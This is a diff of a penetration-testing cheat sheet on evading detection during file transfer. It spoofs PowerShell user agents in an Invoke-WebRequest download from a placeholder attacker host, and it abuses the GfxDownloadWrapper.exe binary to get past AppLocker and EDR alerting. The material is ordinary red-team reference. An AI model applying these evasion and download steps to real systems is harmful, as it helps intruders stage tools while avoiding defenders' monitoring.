@@ -1,35 +1,30 @@
-## PowerShell User Agent Spoofing
+# Evading Detection
 
-Use when default PowerShell **User Agents** are blacklisted or being flagged by defenders. Emulating internal browser traffic like Chrome or IE makes the download request appear legitimate.
+## User Agent Spoofing
 
-List all available browser properties and their corresponding **User Agent** strings:
+List built-in PS user agent strings to pick one matching the target environment:
 
+```powershell
+[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
 ```
-[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]:: $($ _.Name)}} | fl
-```
 
-Assign the Chrome agent to a variable and execute the transfer:
+Download with spoofed UA — swap `Chrome` for `InternetExplorer`, `FireFox`, `Opera`, or `Safari`:
 
-```
+```powershell
 $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
-Invoke-WebRequest http://<ATTACK_IP>/<FILE_NAME> -UserAgent $UserAgent -OutFile "<FILE_PATH>"
+Invoke-WebRequest http://<LHOST>/<FILE> -UserAgent $UserAgent -OutFile <OUTFILE>
 ```
 
-**Blacklisted User Agents** will cause the request to fail or trigger alerts if the emulated browser is not common to the internal environment.
+> [!tip] Match the UA to what's actually used internally — if the org runs Chrome, use Chrome. A Firefox UA on an IE-only environment is still an anomaly.
 
----
+## AppLocker / Whitelisting Bypass
 
-## LOLBin Execution (GfxDownloadWrapper)
+PS and nc blocked → find an approved LOLBin that has download capability. Example — GfxDownloadWrapper.exe (Intel Graphics Driver, present on some hosts):
 
-Use when **Application whitelisting** prevents the use of PowerShell or Netcat. This method bypasses **Command-line logging** alerts by using a trusted Intel Graphics Driver binary typically excluded from monitoring.
-
-Download a file using the Intel GfxDownloadWrapper utility:
-
-```
-GfxDownloadWrapper.exe "http://<ATTACK_IP>/<FILE_NAME>" "<FILE_PATH>"
+```powershell
+GfxDownloadWrapper.exe "http://<LHOST>/<FILE>" "<OUTPATH>"
 ```
 
-- **LOLBAS Project** -> Windows binaries -> Prefer when searching for environment-specific "misplaced trust binaries".
-- **GTFOBins Project** -> Linux binaries -> Prefer for file transfers using nearly 40 commonly installed Linux binaries.
+Whitelisted binaries won't trigger AppLocker and are often excluded from EDR alerting. Check LOLBAS for what's actually present on the target — `dir C:\Windows\System32\` and cross-reference.
 
-**Missing Binary** prevents execution; this specific LOLBin requires the Intel Graphics Driver to be installed on the target.
+> [!tip] There's no universal LOLBin — what's installed varies per host. Before burning a technique, `dir` the system and check LOLBAS for matches. GTFOBins covers ~40 Linux binaries with transfer capability for the same purpose on Linux targets.
